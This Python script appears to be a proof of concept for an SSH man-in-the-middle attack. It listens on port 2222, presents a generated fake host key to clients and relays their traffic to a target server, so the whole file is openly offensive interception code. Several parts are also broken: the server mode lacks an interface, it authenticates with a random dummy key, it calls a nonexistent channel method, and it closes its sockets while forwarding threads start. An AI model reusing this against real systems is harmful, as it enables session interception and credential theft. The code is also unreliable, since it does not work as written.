#!/usr/bin/env python3
import sys
import socket
import threading
import paramiko
import logging

# Configure logging to see protocol interactions
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def create_fake_host_key():
    """Generate a fake host key to present to the client."""
    key = paramiko.RSAKey.generate(2048)
    return key

def mitm_proxy(client_conn, server_conn, fake_host_key):
    """
    Simulates a Man-in-the-Middle proxy.
    It accepts the client connection, presents a fake host key,
    and forwards traffic to the real server.
    """
    try:
        # Create a transport for the client connection
        client_transport = paramiko.Transport(client_conn)
        client_transport.add_server_key(fake_host_key)
        
        # Start the server mode for the client
        client_transport.start_server()
        
        # Wait for the client to connect
        client_channel = client_transport.accept(20)
        if client_channel is None:
            logger.error("Client connection timed out or failed.")
            return
        
        logger.info("Client connected and accepted fake host key.")
        
        # Connect to the real server
        server_transport = paramiko.Transport(server_conn)
        server_transport.start_client()
        
        # Authenticate with the real server (using a dummy key for demonstration)
        # In a real attack, the attacker would need valid credentials or exploit other vulnerabilities
        server_transport.auth_publickey('dummy_user', paramiko.RSAKey.generate(2048))
        
        # Forward traffic between client and server
        def forward(src, dst):
            while True:
                data = src.recv(1024)
                if not data:
                    break
                dst.sendall(data)
        
        threading.Thread(target=forward, args=(client_channel, server_transport.get_channel())).start()
        threading.Thread(target=forward, args=(server_transport.get_channel(), client_channel)).start()
        
    except Exception as e:
        logger.error(f"Error in MitM proxy: {e}")
    finally:
        client_conn.close()
        server_conn.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python poc_host_key_verification_bypass.py <target_ip> <target_port>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    
    # Create a fake host key
    fake_host_key = create_fake_host_key()
    
    # Start a listener for the client connection
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(('0.0.0.0', 2222))  # Listen on port 2222
    listener.listen(1)
    
    logger.info(f"Listening for client connections on port 2222...")
    client_conn, client_addr = listener.accept()
    logger.info(f"Client connected from {client_addr}")
    
    # Connect to the real server
    server_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_conn.connect((target_ip, target_port))
    logger.info(f"Connected to real server at {target_ip}:{target_port}")
    
    # Start the MitM proxy
    mitm_thread = threading.Thread(target=mitm_proxy, args=(client_conn, server_conn, fake_host_key))
    mitm_thread.start()
    mitm_thread.join()
    
    listener.close()

if __name__ == "__main__":
    main()